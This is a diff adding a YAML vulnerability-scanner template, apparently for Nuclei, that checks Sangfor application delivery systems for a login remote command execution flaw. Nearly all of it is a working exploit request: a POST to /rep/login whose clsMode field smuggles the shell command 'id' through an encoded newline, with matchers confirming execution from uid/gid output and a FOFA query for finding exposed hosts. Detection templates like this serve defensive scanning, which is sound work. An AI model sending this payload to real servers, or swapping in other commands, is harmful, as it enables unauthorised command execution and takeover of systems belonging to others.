@@ -1,0 +1,32 @@
+id: sangfor-login-rce
+
+info:
+  name: Sangfor Application Login - Remote Command Execution
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Sangfor application delivery management system login has a remote command execution vulnerability, through which an attacker can obtain server privileges and execute arbitrary commands
+  reference:
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/sangfor-login-rce.yaml
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: fid="iaytNA57019/kADk8Nev7g=="
+  tags: sangfor,rce
+
+http:
+  - raw:
+      - |
+        POST /rep/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - regex("uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)", body)
+          - contains(body, "cluster_mode_others")
+        condition: and
